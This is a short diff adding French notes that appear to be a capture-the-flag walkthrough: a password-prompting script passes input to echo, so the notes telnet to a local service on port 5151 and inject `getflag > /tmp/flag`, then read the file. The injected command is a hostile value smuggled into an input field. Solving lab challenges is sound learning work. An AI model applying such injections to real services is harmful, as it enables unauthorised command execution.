@@ -1,0 +1,9 @@
+le script indique qu'il faut entrer un mot de passe
+il y a une fonction hash dans laquelle il y a la fonction echo 
+on peut faire une injection de commande
+
+touch /tmp/flag
+chmod 777 /tmp/flag
+telnet 127.0.0.1 5151
+insérer la commande : `getflag > /tmp/flag`
+puis cat /tmp/flag
